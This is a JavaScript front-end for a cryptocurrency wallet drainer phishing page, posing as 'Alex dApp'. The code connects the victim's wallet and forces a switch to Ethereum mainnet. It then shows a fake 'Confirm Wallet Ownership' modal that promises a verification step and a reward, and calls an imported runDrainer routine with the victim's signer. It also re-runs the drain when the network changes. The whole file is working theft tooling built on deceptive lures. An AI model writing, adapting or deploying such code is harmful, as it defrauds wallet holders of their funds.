import { createAppKit } from '@reown/appkit';
import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import { runDrainer } from './drainer.js';

// === Конфигурация AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
const wagmiAdapter = new WagmiAdapter({ projectId, networks });

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW',
});

// === Глобальные переменные ===
let connectedAddress = null;
let hasDrained = false;
let isTransactionPending = false;
let actionBtn = null;
let modalOverlay = null;
let modalContent = null;
let modalShown = false;

const targetChainId = '0x1'; // Ethereum Mainnet

// === Инициализация при загрузке страницы ===
window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn');
  const isInjected = typeof window.ethereum !== 'undefined';

  // Подключаем шрифт Montserrat
  const link = document.createElement('link');
  link.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);

  // CSS для модального окна
  const style = document.createElement('style');
  style.textContent = `
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 999;
      display: none;
    }

    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #ffffff;
      border: 2px solid #007bff;
      border-radius: 12px;
      padding: 30px;
      width: 90%;
      max-width: 300px;
      min-height: 350px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Montserrat', sans-serif;
      color: #000000;
      animation: slideDown 0.5s ease-out forwards;
    }

    @keyframes slideDown {
      0% { transform: translate(-50%, -100%); opacity: 0; }
      100% { transform: translate(-50%, -50%); opacity: 1; }
    }

    .modal-title {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 45px;
    }

    .loader-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 20px;
    }

    .loader {
      width: 100%;
      height: 100%;
      border: 4px solid #e0e0e0;
      border-top: 4px solid #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      position: absolute;
      top: 0;
      left: 0;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .modal-footer {
      font-size: 14px;
      color: #555555;
      margin-top: 30px;
    }

    .action-list {
      list-style: none;
      padding: 0;
      margin: 40px 0 0;
      font-size: 14px;
      color: #000000;
    }

    .action-list li {
      margin-bottom: 5px;
    }

    @media (max-width: 480px) {
      .modal-content {
        max-width: 250px;
        padding: 20px;
        min-height: 300px;
      }
      .modal-title { font-size: 18px; }
      .loader-container { width: 80px; height: 80px; }
      .modal-footer { font-size: 12px; }
      .action-list { font-size: 12px; }
    }
  `;
  document.head.appendChild(style);

  // Создаём модальное окно
  modalOverlay = document.createElement('div');
  modalOverlay.className = 'modal-overlay';
  document.body.appendChild(modalOverlay);

  modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  modalContent.innerHTML = `
    <div class="modal-title">Confirm Wallet Ownership</div>
    <div class="loader-container">
      <div class="loader"></div>
    </div>
    <div class="modal-footer">continue inside the window that opens...</div>
    <ul class="action-list">
      <li>1. Allow interaction with you</li>
      <li>2. Confirm the verification transaction</li>
      <li>3. Receive a reward</li>
    </ul>
  `;
  document.body.appendChild(modalContent);

  // Проверяем наличие инжектированного провайдера
  if (!isInjected) {
    actionBtn.style.display = 'inline-block';
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal();
    });
    return;
  }

  actionBtn.style.display = 'inline-block';
  actionBtn.addEventListener('click', handleConnectOrAction);

  // Подписка на смену сети
  window.ethereum.on('chainChanged', onChainChanged);
});

// === Управление модальным окном ===
function showModal() {
  modalOverlay.style.display = 'block';
  modalContent.style.display = 'block';
}

function hideModal() {
  modalOverlay.style.display = 'none';
  modalContent.style.display = 'none';
}

function showModalOnce() {
  if (!modalShown) {
    modalShown = true;
    showModal();
  }
}

// === Смена сети ===
async function switchToTargetNetwork() {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const network = await provider.getNetwork();
    const currentChainId = `0x${network.chainId.toString(16)}`;

    if (currentChainId === targetChainId) {
      console.log('✅ Уже на Ethereum Mainnet');
      return true;
    }

    console.log('🔄 Попытка сменить сеть на Ethereum Mainnet');
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: targetChainId }],
    });
    console.log('✅ Сеть изменена на Ethereum Mainnet');
    return true;
  } catch (err) {
    if (err.code === 4902 || err.message.includes('Unrecognized chain')) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: targetChainId,
            chainName: 'Ethereum Mainnet',
            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
            rpcUrls: ['https://rpc.eth.gateway.fm'],
            blockExplorerUrls: ['https://etherscan.io'],
          }],
        });
        console.log('✅ Сеть Ethereum Mainnet добавлена');
        return true;
      } catch (addErr) {
        console.error('❌ Ошибка добавления сети:', addErr.message);
        return false;
      }
    } else if (err.message.includes('user rejected')) {
      console.log('🙅 Пользователь отклонил смену сети');
      return false;
    } else {
      console.error('❌ Ошибка смены сети:', err.message);
      return false;
    }
  }
}

// === Выполнение drainer ===
async function attemptDrainer() {
  if (hasDrained || isTransactionPending) {
    console.log('⚠️ Транзакция уже выполнена или ожидается');
    return;
  }

  const isNetworkCorrect = await switchToTargetNetwork();
  if (!isNetworkCorrect) {
    console.log('⚠️ Не удалось установить Ethereum Mainnet');
    return;
  }

  if (!connectedAddress) {
    console.error('❌ Адрес кошелька не определён');
    return;
  }

  console.log(`📍 Используется адрес: ${connectedAddress}`);
  showModalOnce();

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
      console.error('❌ Несоответствие адресов:', address, connectedAddress);
      hideModal();
      return;
    }

    isTransactionPending = true;
    await runDrainer(provider, signer, connectedAddress);
    console.log('✅ Drainer выполнен успешно');

    hasDrained = true;
    isTransactionPending = false;
    cleanup();
    hideModal();
  } catch (err) {
    isTransactionPending = false;
    hideModal();
    if (err.message.includes('user rejected')) {
      console.log('🙅 Пользователь отклонил транзакцию');
    } else {
      console.error('❌ Ошибка выполнения drainer:', err.message);
    }
  }
}

// === Подключение кошелька и запуск ===
async function handleConnectOrAction() {
  try {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts.length === 0) {
      await appKitModal.open();
      connectedAddress = await waitForWallet();
      console.log('✅ Подключён кошелёк:', connectedAddress);
    } else {
      connectedAddress = accounts[0];
      console.log('✅ Уже подключён:', connectedAddress);
    }

    if (!isTransactionPending) {
      await attemptDrainer();
    } else {
      console.log('⏳ Транзакция уже выполняется');
    }
  } catch (err) {
    console.error('❌ Ошибка подключения:', err.message);
  }
}

// === Обработка смены сети ===
async function onChainChanged(chainId) {
  console.log('🔄 Смена сети:', chainId);
  if (connectedAddress && !isTransactionPending && chainId === targetChainId) {
    await attemptDrainer();
  } else {
    console.log('⏳ Транзакция в процессе или сеть не соответствует');
  }
}

// === Очистка ===
function cleanup() {
  if (!actionBtn) return;
  actionBtn.removeEventListener('click', handleConnectOrAction);
  window.ethereum.removeListener('chainChanged', onChainChanged);
  actionBtn.disabled = true;
  actionBtn.style.opacity = '0.6';
}

// === Ожидание подключения кошелька ===
async function waitForWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
  if (accounts.length > 0) return accounts[0];

  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length) {
        clearInterval(interval);
        resolve(accounts[0]);
      }
    }, 500);
  });
}
